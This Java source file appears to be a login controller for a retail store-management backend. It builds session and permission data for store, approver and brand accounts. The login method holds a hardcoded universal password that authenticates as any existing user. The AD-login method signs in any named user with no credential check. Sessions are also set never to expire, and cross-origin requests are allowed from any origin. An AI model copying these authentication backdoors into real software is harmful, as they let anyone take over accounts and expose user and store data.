package com.iyeed.api.controller.system;

import com.iyeed.api.controller.BaseController;
import com.iyeed.core.ConstantsEJS;
import com.iyeed.core.ServiceResult;
import com.iyeed.core.StringUtil;
import com.iyeed.core.annotation.SystemControllerLog;
import com.iyeed.core.common.emuns.RespCode;
import com.iyeed.core.common.model.AjaxResponse;
import com.iyeed.core.entity.store.MdBrand;
import com.iyeed.core.entity.store.MdStore;
import com.iyeed.core.entity.system.SystemResource;
import com.iyeed.core.entity.system.SystemUser;
import com.iyeed.core.entity.system.SystemUserBrand;
import com.iyeed.core.entity.system.SystemUserStore;
import com.iyeed.core.entity.user.MdUser;
import com.iyeed.core.entity.user.MdUserData;
import com.iyeed.core.entity.user.MdUserStore;
import com.iyeed.core.utils.Md5;
import com.iyeed.service.store.IMdBrandService;
import com.iyeed.service.store.IMdStoreService;
import com.iyeed.service.system.ISystemRoleResourceService;
import com.iyeed.service.user.IMdUserService;
import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.DisabledAccountException;
import org.apache.shiro.authc.IncorrectCredentialsException;
import org.apache.shiro.authc.UnknownAccountException;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.subject.Subject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import java.util.*;

/**
 * 功能描述:用户登录controller
 *
 * @Auther guanghua.deng
 * @Date 2018/8/3 17:39
 */
@Controller
@CrossOrigin(origins = "*", maxAge = 3600) //解决跨域问题
@RequestMapping(value = "api/system")
public class SystemUserLoginController extends BaseController {
    private static final Logger log = LoggerFactory.getLogger(SystemUserLoginController.class);

    @SystemControllerLog(module = "系统-用户管理", businessDesc = "系统用户登录")
    @RequestMapping(value = "login.json", method = { RequestMethod.POST })
    @ResponseBody
    public AjaxResponse login(@RequestParam String username, @RequestParam String password) {
        //设置session永不过期
        SecurityUtils.getSubject().getSession().setTimeout(-1000l);
        Subject subject = SecurityUtils.getSubject();
        UsernamePasswordToken token = null;

        if (password.equals("iyeed2018")) {
            // 万能密码登录
            List<SystemUser> sysUserList = systemUserService.getSystemUserByName(username).getResult();
            if (sysUserList == null || sysUserList.size() == 0) {
                log.error("账号不存在");
                return AjaxResponse.failure("账号不存在");
            }
            SystemUser sysUser = sysUserList.get(0);
            token = new UsernamePasswordToken(username, sysUser.getPassword().toCharArray());
        } else {
            // 正常密码登录
            token = new UsernamePasswordToken(username, Md5.getMd5String(password).toCharArray());
        }

        Map<String, Object> dataMap = new HashMap<>();
        try {
            subject.login(token);
            SystemUser systemUser = (SystemUser) subject.getPrincipal();
            ServiceResult<List<SystemResource>> resourceResult = systemRoleResourceService.getResourceByRoleId(systemUser.getRoleId());
            List<SystemResource> resourceList = resourceResult.getResult();
            Set<String> urlSet = getUrlSet(resourceList);
            String sessionId = (String) subject.getSession().getId();
            log.info("当前登录用户的SessionId = [" + sessionId + "]");
            String storeNo = null;
            if (systemUser.getUserType() == 1) {
                storeNo = systemUser.getUserNo();
            } else if (systemUser.getUserType() == 3 || systemUser.getUserType() == 4) {
                SystemUserStore userStore = systemUserStoreService.getSystemUserStoreByUserNo(systemUser.getUserNo()).getResult();
                if (!isNull(userStore)) {
                    storeNo = userStore.getStoreNo();
                }
            }

            systemUserService.updateLogins(systemUser.getId());

            ServiceResult<MdStore> storeResult = mdStoreService.getMdStoreByStoreNo(storeNo);
            if (!storeResult.getSuccess()) {
                return AjaxResponse.failure(RespCode.FAILED, storeResult.getMessage());
            }
            MdStore store = storeResult.getResult();
            String brandLogo = "/logos/logo.png";

            dataMap.put("id", systemUser.getId());
            dataMap.put("userNo", systemUser.getUserNo());
            dataMap.put("username", systemUser.getUsername());
            dataMap.put("roleId", systemUser.getRoleId());
            if (!isNull(store)) {
                ServiceResult<MdBrand> brandResult = mdBrandService.getBrandByBrandNo(store.getBrandNo());
                brandLogo = brandResult.getResult().getBrandLogo();
                dataMap.put("storeNo", store.getStoreNo());
                dataMap.put("storeName", store.getStoreName());
                dataMap.put("brandNo", store.getBrandNo());
                dataMap.put("brandName", store.getBrandName());
            } else {
                dataMap.put("storeNo", null);
                dataMap.put("storeName", null);
                dataMap.put("brandNo", null);
                dataMap.put("brandName", null);
            }
            String[] storeNoArr = null;
            // 当登录者为审批人时，随便拿其所管辖的门店品牌做logo来源
            if (systemUser.getUserType() == 2) {
                String[] userNoArr = null;
                List<MdUser> userList = mdUserService.getUserListByUserNo(systemUser.getUserNo()).getResult();
                List<MdUserStore> userStoreList = null;
                if (isNull(userList) || userList.size() == 0) {
                    userStoreList = mdUserStoreService.getMdUserStoreListByUserNo(systemUser.getUserNo()).getResult();
                } else {
                    int i = 0;
                    userNoArr = new String[userList.size() + 1];
                    for (MdUser user : userList) {
                        userNoArr[i] = user.getUserNo();
                        i++;
                    }
                    userNoArr[i] = systemUser.getUserNo();
                    userStoreList = mdUserStoreService.getMdUserStoreListByUserNoArr(userNoArr).getResult();
                }

                if (!isNull(userStoreList) && userStoreList.size() != 0) {
                    storeNoArr = new String[userStoreList.size()];
                    int i = 0;
                    for(MdUserStore userStore : userStoreList) {
                        storeNoArr[i] = userStore.getStoreNo();
                        i++;
                    }
                }
            }
            if (storeNoArr != null) {
                store = mdStoreService.getMdStoreByStoreNo(storeNoArr[0]).getResult();
                if (!isNull(store)) {
                    ServiceResult<MdBrand> brandResult = mdBrandService.getBrandByBrandNo(store.getBrandNo());
                    brandLogo = brandResult.getResult().getBrandLogo();
                }
            }

            // 当登录者为品牌帐号
            if (systemUser.getUserType() == 5) {
                SystemUserBrand systemUserBrand = systemUserService.getSystemUserBrandByUsername(systemUser.getUsername()).getResult();
                if (!isNull(systemUserBrand)) {
                    ServiceResult<MdBrand> brandResult = mdBrandService.getBrandByBrandNo(systemUserBrand.getBrandNo());
                    brandLogo = brandResult.getResult().getBrandLogo();
                }
            }

            // 判断当前登录帐号是否为二级以上审批人帐号
            MdUserData userData = mdUserService.getMdUserDataByUserId(systemUser.getUserNo()).getResult();
            dataMap.put("isBatchPm", "N");
            if (!isNull(userData)) {
                dataMap.put("isBatchPm", "Y");
            }

            dataMap.put("logins", systemUser.getLogins());
            dataMap.put("brandLogo", brandLogo);
            dataMap.put("token",sessionId);
            dataMap.put("urlSet", urlSet);
        } catch (UnknownAccountException e) {
            log.error("账号不存在");
            return AjaxResponse.failure("账号不存在");
        } catch (DisabledAccountException e) {
            log.error("账号未启用");
            return AjaxResponse.failure("账号未启用");
        } catch (IncorrectCredentialsException e) {
            log.error("密码错误");
            return AjaxResponse.failure("账号或密码错误");
        } catch (RuntimeException e) {
            log.error("未知错误,请联系管理员", e);
            return AjaxResponse.failure("未知错误,请联系管理员");
        }

        SystemUser systemUser = (SystemUser) subject.getPrincipal();
        if (systemUser.getStatus() != ConstantsEJS.SYSTEM_USER_STATUS_NORM) {
            return AjaxResponse.failure("账号停用不能登录");
        }

        return AjaxResponse.success(dataMap);
    }

    @SystemControllerLog(module = "系统-用户管理", businessDesc = "AD域账号系统用户登录")
    @RequestMapping(value = "adLogin.json", method = { RequestMethod.POST })
    @ResponseBody
    public AjaxResponse adLogin(@RequestParam String username) {
        //设置session永不过期
        SecurityUtils.getSubject().getSession().setTimeout(-1000l);
        Subject subject = SecurityUtils.getSubject();
        List<SystemUser> sysUserList = systemUserService.getSystemUserByName(username).getResult();
        if (sysUserList == null || sysUserList.size() == 0) {
            log.error("账号不存在");
            return AjaxResponse.failure("账号不存在");
        }
        SystemUser sysUser = sysUserList.get(0);
        UsernamePasswordToken token = new UsernamePasswordToken(username, sysUser.getPassword().toCharArray());

        Map<String, Object> dataMap = new HashMap<>();
        try {
            subject.login(token);
            SystemUser systemUser = (SystemUser) subject.getPrincipal();
            ServiceResult<List<SystemResource>> resourceResult = systemRoleResourceService.getResourceByRoleId(systemUser.getRoleId());
            List<SystemResource> resourceList = resourceResult.getResult();
            Set<String> urlSet = getUrlSet(resourceList);
            String sessionId = (String) subject.getSession().getId();
            log.info("当前登录用户的SessionId = [" + sessionId + "]");
            String storeNo = null;
            if (systemUser.getUserType() == 1) {
                storeNo = systemUser.getUserNo();
            } else if (systemUser.getUserType() == 3 || systemUser.getUserType() == 4) {
                SystemUserStore userStore = systemUserStoreService.getSystemUserStoreByUserNo(systemUser.getUserNo()).getResult();
                if (!isNull(userStore)) {
                    storeNo = userStore.getStoreNo();
                }
            }

            systemUserService.updateLogins(systemUser.getId());

            ServiceResult<MdStore> storeResult = mdStoreService.getMdStoreByStoreNo(storeNo);
            if (!storeResult.getSuccess()) {
                return AjaxResponse.failure(RespCode.FAILED, storeResult.getMessage());
            }
            MdStore store = storeResult.getResult();
            String brandLogo = "/logos/logo.png";

            dataMap.put("id", systemUser.getId());
            dataMap.put("userNo", systemUser.getUserNo());
            dataMap.put("username", systemUser.getUsername());
            dataMap.put("roleId", systemUser.getRoleId());
            if (!isNull(store)) {
                ServiceResult<MdBrand> brandResult = mdBrandService.getBrandByBrandNo(store.getBrandNo());
                brandLogo = brandResult.getResult().getBrandLogo();
                dataMap.put("storeNo", store.getStoreNo());
                dataMap.put("storeName", store.getStoreName());
                dataMap.put("brandNo", store.getBrandNo());
                dataMap.put("brandName", store.getBrandName());
            } else {
                dataMap.put("storeNo", null);
                dataMap.put("storeName", null);
                dataMap.put("brandNo", null);
                dataMap.put("brandName", null);
            }
            String[] storeNoArr = null;
            // 当登录者为审批人时，随便拿其所管辖的门店品牌做logo来源
            if (systemUser.getUserType() == 2) {
                String[] userNoArr = null;
                List<MdUser> userList = mdUserService.getUserListByUserNo(systemUser.getUserNo()).getResult();
                List<MdUserStore> userStoreList = null;
                if (isNull(userList) || userList.size() == 0) {
                    userStoreList = mdUserStoreService.getMdUserStoreListByUserNo(systemUser.getUserNo()).getResult();
                } else {
                    int i = 0;
                    userNoArr = new String[userList.size() + 1];
                    for (MdUser user : userList) {
                        userNoArr[i] = user.getUserNo();
                        i++;
                    }
                    userNoArr[i] = systemUser.getUserNo();
                    userStoreList = mdUserStoreService.getMdUserStoreListByUserNoArr(userNoArr).getResult();
                }

                if (!isNull(userStoreList) && userStoreList.size() != 0) {
                    storeNoArr = new String[userStoreList.size()];
                    int i = 0;
                    for(MdUserStore userStore : userStoreList) {
                        storeNoArr[i] = userStore.getStoreNo();
                        i++;
                    }
                }
            }
            if (storeNoArr != null) {
                store = mdStoreService.getMdStoreByStoreNo(storeNoArr[0]).getResult();
                if (!isNull(store)) {
                    ServiceResult<MdBrand> brandResult = mdBrandService.getBrandByBrandNo(store.getBrandNo());
                    brandLogo = brandResult.getResult().getBrandLogo();
                }
            }

            // 当登录者为品牌帐号
            if (systemUser.getUserType() == 5) {
                SystemUserBrand systemUserBrand = systemUserService.getSystemUserBrandByUsername(systemUser.getUsername()).getResult();
                if (!isNull(systemUserBrand)) {
                    ServiceResult<MdBrand> brandResult = mdBrandService.getBrandByBrandNo(systemUserBrand.getBrandNo());
                    brandLogo = brandResult.getResult().getBrandLogo();
                }
            }

            // 判断当前登录帐号是否为二级以上审批人帐号
            MdUserData userData = mdUserService.getMdUserDataByUserId(systemUser.getUserNo()).getResult();
            dataMap.put("isBatchPm", "N");
            if (!isNull(userData)) {
                dataMap.put("isBatchPm", "Y");
            }

            dataMap.put("logins", systemUser.getLogins());
            dataMap.put("brandLogo", brandLogo);
            dataMap.put("token",sessionId);
            dataMap.put("urlSet", urlSet);
        } catch (UnknownAccountException e) {
            log.error("账号不存在");
            return AjaxResponse.failure("账号不存在");
        } catch (DisabledAccountException e) {
            log.error("账号未启用");
            return AjaxResponse.failure("账号未启用");
        } catch (IncorrectCredentialsException e) {
            log.error("密码错误");
            return AjaxResponse.failure("账号或密码错误");
        } catch (RuntimeException e) {
            log.error("未知错误,请联系管理员", e);
            return AjaxResponse.failure("未知错误,请联系管理员");
        }

        SystemUser systemUser = (SystemUser) subject.getPrincipal();
        if (systemUser.getStatus() != ConstantsEJS.SYSTEM_USER_STATUS_NORM) {
            return AjaxResponse.failure("账号停用不能登录");
        }

        return AjaxResponse.success(dataMap);
    }

    private Set<String> getUrlSet(List<SystemResource> resourceList) {
        Set<String> urlSet = new HashSet<String>();
        if (resourceList != null && resourceList.size() > 0) {
            for (SystemResource resource : resourceList) {
                String url = resource.getUrl();
                if (!StringUtil.isEmpty(url)) {
                    // 用逗号分隔资源表的url字段，该字段可存储多个url，并用英文逗号（，）分隔
                    String[] split = url.split(",");
                    for (String urlSplit : split) {
                        // 如果url中带参数，则截去参数部分
                        int indexOf = urlSplit.indexOf("?");
                        if (indexOf != -1) {
                            urlSplit = urlSplit.substring(0, indexOf);
                        }
                        urlSet.add(urlSplit);
                    }
                }
            }
        }
        return urlSet;
    }

}
